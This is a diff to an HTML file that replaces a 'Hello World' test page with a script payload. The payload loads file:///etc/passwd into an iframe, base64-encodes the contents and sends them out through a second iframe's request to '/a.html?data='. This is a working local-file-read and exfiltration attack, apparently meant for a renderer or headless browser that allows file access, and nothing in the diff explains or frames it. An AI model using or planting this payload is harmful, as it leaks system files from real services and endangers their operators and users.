@@ -1,8 +1,14 @@
 <html>
-<head>
-<title>HELLO WORLD</title>
-</head>
   <body>
-    Testing!
+    <iframe id="file"></iframe>
+    <iframe id="exfil"></iframe>
+    <script>
+      var frame = document.getElementById('file');
+      frame.src = 'file:///etc/passwd';
+      frame.onload = function() {
+        const base64File = btoa(frame.contentDocument.body.innerHTML);
+        document.getElementById('exfil').src = "/a.html?data=" + base64File;
+      }
+    </script>
   </body>
 </html>
